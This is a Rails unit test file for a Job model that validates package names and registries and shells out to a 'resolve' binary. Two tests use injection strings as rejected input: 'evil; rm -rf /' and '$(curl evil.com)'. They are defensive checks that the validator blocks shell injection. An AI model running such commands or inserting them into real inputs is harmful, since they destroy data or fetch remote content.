require "test_helper"

class JobTest < ActiveSupport::TestCase
  setup do
    Registry.create!(name: 'rubygems.org', url: 'https://rubygems.org', ecosystem: 'rubygems', packages_count: 1000)
    Registry.create!(name: 'npmjs.org', url: 'https://www.npmjs.com', ecosystem: 'npm', packages_count: 2000)
  end

  test "valid with registry" do
    job = Job.new(registry: 'rubygems.org', package_name: 'rails', status: 'pending')
    assert job.valid?
  end

  test "valid with ecosystem" do
    job = Job.new(ecosystem: 'npm', package_name: 'express', status: 'pending')
    assert job.valid?
  end

  test "invalid without registry or ecosystem" do
    job = Job.new(package_name: 'rails', status: 'pending')
    assert_not job.valid?
    assert_includes job.errors.full_messages, "Either registry or ecosystem must be provided"
  end

  test "invalid without package_name" do
    job = Job.new(registry: 'rubygems.org', status: 'pending')
    assert_not job.valid?
  end

  test "invalid with malicious package name" do
    job = Job.new(registry: 'rubygems.org', package_name: 'evil; rm -rf /', status: 'pending')
    assert_not job.valid?
    assert job.errors[:package_name].any?
  end

  test "invalid with shell injection in package name" do
    job = Job.new(registry: 'rubygems.org', package_name: '$(curl evil.com)', status: 'pending')
    assert_not job.valid?
  end

  test "valid maven-style package name" do
    job = Job.new(registry: 'rubygems.org', package_name: 'com.google.guava:guava', status: 'pending')
    assert job.valid?
  end

  test "valid scoped npm package name" do
    job = Job.new(registry: 'npmjs.org', package_name: '@babel/core', status: 'pending')
    Registry.create!(name: 'npmjs.org', url: 'https://www.npmjs.com', ecosystem: 'npm', packages_count: 2000) unless Registry.exists?(name: 'npmjs.org')
    assert job.valid?
  end

  test "invalid with unknown registry" do
    job = Job.new(registry: 'unknown.org', package_name: 'rails', status: 'pending')
    assert_not job.valid?
    assert job.errors[:registry].any?
  end

  test "ecosystem is not persisted" do
    job = Job.new(registry: 'rubygems.org', package_name: 'rails', status: 'pending', ecosystem: 'gem')
    job.save!
    fresh = Job.find(job.id)
    assert_nil fresh.ecosystem
  end

  test "tree is not persisted" do
    job = Job.new(registry: 'rubygems.org', package_name: 'rails', status: 'pending', tree: true)
    job.save!
    fresh = Job.find(job.id)
    assert_nil fresh.tree
  end

  test "resolve calls binary and stores results on success" do
    job = Job.create!(registry: 'rubygems.org', package_name: 'split', status: 'pending')

    Open3.expects(:capture3).with(
      Job.resolve_binary,
      '--registry', 'rubygems.org',
      '--package', 'split'
    ).returns(['{"redis": "5.0.0"}', '', stub(success?: true)])

    job.resolve
    assert_equal 'complete', job.status
    assert_equal({ 'redis' => '5.0.0' }, job.results)
  end

  test "resolve passes version when not default" do
    job = Job.create!(registry: 'rubygems.org', package_name: 'split', status: 'pending', version: '4.0.0')

    Open3.expects(:capture3).with(
      Job.resolve_binary,
      '--registry', 'rubygems.org',
      '--package', 'split',
      '--version', '4.0.0'
    ).returns(['{}', '', stub(success?: true)])

    job.resolve
    assert_equal 'complete', job.status
  end

  test "resolve skips version for >= 0" do
    job = Job.create!(registry: 'rubygems.org', package_name: 'split', status: 'pending', version: '>= 0')

    Open3.expects(:capture3).with(
      Job.resolve_binary,
      '--registry', 'rubygems.org',
      '--package', 'split'
    ).returns(['{}', '', stub(success?: true)])

    job.resolve
    assert_equal 'complete', job.status
  end

  test "resolve passes ecosystem flag" do
    job = Job.create!(registry: 'rubygems.org', package_name: 'split', status: 'pending')
    job.ecosystem = 'gem'

    Open3.expects(:capture3).with(
      Job.resolve_binary,
      '--registry', 'rubygems.org',
      '--ecosystem', 'gem',
      '--package', 'split'
    ).returns(['{}', '', stub(success?: true)])

    job.resolve
    assert_equal 'complete', job.status
  end

  test "resolve passes tree flag" do
    job = Job.create!(registry: 'rubygems.org', package_name: 'split', status: 'pending')
    job.tree = true

    Open3.expects(:capture3).with(
      Job.resolve_binary,
      '--registry', 'rubygems.org',
      '--package', 'split',
      '--tree'
    ).returns(['[]', '', stub(success?: true)])

    job.resolve
    assert_equal 'complete', job.status
  end

  test "resolve stores error on binary failure" do
    job = Job.create!(registry: 'rubygems.org', package_name: 'split', status: 'pending')

    Open3.expects(:capture3).returns(['', '{"error":"something broke"}', stub(success?: false)])

    job.resolve
    assert_equal 'error', job.status
    assert_equal({ 'error' => 'something broke' }, job.results)
  end

  test "resolve stores error on exception" do
    job = Job.create!(registry: 'rubygems.org', package_name: 'split', status: 'pending')

    Open3.expects(:capture3).raises(Errno::ENOENT.new("resolve"))

    job.resolve
    assert_equal 'error', job.status
    assert job.results['error'].include?('ENOENT')
  end

  test "resolve_binary defaults to resolve" do
    assert_equal 'resolve', Job.resolve_binary
  end

  test "resolve_binary reads from env" do
    ENV['RESOLVE_BINARY'] = '/usr/local/bin/resolve'
    assert_equal '/usr/local/bin/resolve', Job.resolve_binary
  ensure
    ENV.delete('RESOLVE_BINARY')
  end
end
